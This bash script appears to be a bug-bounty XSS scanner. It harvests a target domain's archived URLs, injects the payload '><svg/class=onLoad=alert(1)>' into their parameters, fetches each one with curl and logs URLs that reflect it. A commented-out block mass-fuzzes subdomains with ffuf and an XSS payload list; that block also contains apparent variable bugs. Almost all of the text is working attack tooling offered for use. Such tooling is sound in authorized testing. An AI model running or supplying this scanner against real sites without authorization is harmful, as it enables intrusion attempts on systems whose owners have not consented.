#!/bin/bash

#	XSS CALLBACK:
#	Log file: active.XSS.log

	if [ $# -lt 1 ]; then
		echo "Usage: active.XSS target.com"
	else
	
		export HOST=$1

		echo -e "\033[0;32mRunning\n"; gau $HOST | uro | gf xss | qsreplace "><svg/class=onLoad=alert(1)>" | while read url ; do curl -sk --path-as-is "$url" | if grep -qs "onLoad"; then echo -e "[Potential XXS VULN] $url" | anew active.XSS.log; else echo -e $url "\033[0;32mNot Vulnerable"; fi; done

	fi
#	MASS subdomains xss

#	echo -e "\033[0;32mRunning\n"; for x in $x `cat 02.HTTPROBE.ALIVE.lst`; do gau $x | uro | gf xss | qsreplace "FUZZ" | while read url ; do ffuf -u $URL -w $HOME/WORKZONE/payloads/XSS.2.<firebrand> -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -X POST -c -t 30 -rate 11 -p 2 -r -mc 200 -ac -sa -fr '<firebrand>' -or -od XSS.OUTPUT -of json -o XSS.ffuf.json ; done

#	--------------------------------------------------------------------------------------------------------------
#	--------------------------------------------------------------------------------------------------------------